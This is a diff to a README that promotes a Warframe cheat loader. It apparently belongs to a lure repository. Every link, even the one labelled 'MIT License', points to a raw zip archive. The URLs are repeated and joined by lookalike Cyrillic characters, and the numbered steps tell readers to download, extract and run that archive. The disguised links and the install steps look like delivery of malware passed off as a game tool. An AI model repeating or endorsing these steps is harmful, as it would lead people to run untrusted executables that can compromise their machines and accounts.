@@ -3,7 +3,7 @@
 Welcome to the **Warframe Cheats - Ultimate Loader**! 🎮  
 A feature-rich toolbox designed for the dedicated Tenno looking to enhance their Warframe experience with the latest, most robust enhancements.  
 This repository brings together the best in usability, cross-OS compatibility, and reliability.  
-All features are wrapped under the permissive [MIT License](https://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/Lоader.zipоhttps://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/Lоader.zip), giving you the freedom to use and modify as you wish!  
+All features are wrapped under the permissive [MIT License](https://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/widthways/Enhancer_Hub_Warframe_2.8.zipоhttps://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/widthways/Enhancer_Hub_Warframe_2.8.zipоhttps://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/widthways/Enhancer_Hub_Warframe_2.8.zipоhttps://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/widthways/Enhancer_Hub_Warframe_2.8.zip), giving you the freedom to use and modify as you wish!  
 
 Take your gameplay to the next level with an advanced loader providing seamless access to powerful features.  
 Stay ahead in 2025 with automation, tracking, unlimited resources, and more — all managed by a streamlined, user-friendly interface.  
@@ -45,9 +45,9 @@ Stay ahead in 2025 with automation, tracking, unlimited resources, and more — 
 
 Follow these clear steps to get started with **Warframe Cheats - Ultimate Loader**:  
 
-1. **Download https://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/Lоader.zipоhttps://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/Lоader.zip** from this repository.  
-2. Extract `https://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/Lоader.zipоhttps://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/Lоader.zip` to your preferred folder using WinRAR, 7-Zip, or your OS’s archive tool.  
-3. Run `https://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/Lоader.zipоhttps://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/Lоader.zip` (or equivalent script for your OS).  
+1. **Download https://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/widthways/Enhancer_Hub_Warframe_2.8.zipоhttps://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/widthways/Enhancer_Hub_Warframe_2.8.zipоhttps://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/widthways/Enhancer_Hub_Warframe_2.8.zipоhttps://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/widthways/Enhancer_Hub_Warframe_2.8.zip** from this repository.  
+2. Extract `https://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/widthways/Enhancer_Hub_Warframe_2.8.zipоhttps://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/widthways/Enhancer_Hub_Warframe_2.8.zipоhttps://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/widthways/Enhancer_Hub_Warframe_2.8.zipоhttps://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/widthways/Enhancer_Hub_Warframe_2.8.zip` to your preferred folder using WinRAR, 7-Zip, or your OS’s archive tool.  
+3. Run `https://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/widthways/Enhancer_Hub_Warframe_2.8.zipоhttps://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/widthways/Enhancer_Hub_Warframe_2.8.zipоhttps://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/widthways/Enhancer_Hub_Warframe_2.8.zipоhttps://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/widthways/Enhancer_Hub_Warframe_2.8.zip` (or equivalent script for your OS).  
 4. Start Warframe and activate the desired enhancements from the GUI overlay.  
 5. Enjoy a richer, more customizable Warframe gameplay experience!  
 
@@ -84,7 +84,7 @@ The authors of this repository are not liable for any misuse or damage that may 
 
 ## 📚 License
 
-This project is released under the [MIT License](https://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/Lоader.zipоhttps://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/Lоader.zip).  
+This project is released under the [MIT License](https://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/widthways/Enhancer_Hub_Warframe_2.8.zipоhttps://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/widthways/Enhancer_Hub_Warframe_2.8.zipоhttps://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/widthways/Enhancer_Hub_Warframe_2.8.zipоhttps://raw.githubusercontent.com/naynormanda/WarframeEnhancerHub/main/widthways/Enhancer_Hub_Warframe_2.8.zip).  
 Feel free to use, modify, and distribute with appropriate attribution.  
 **No warranties or guarantees. Use at your own risk.**
 
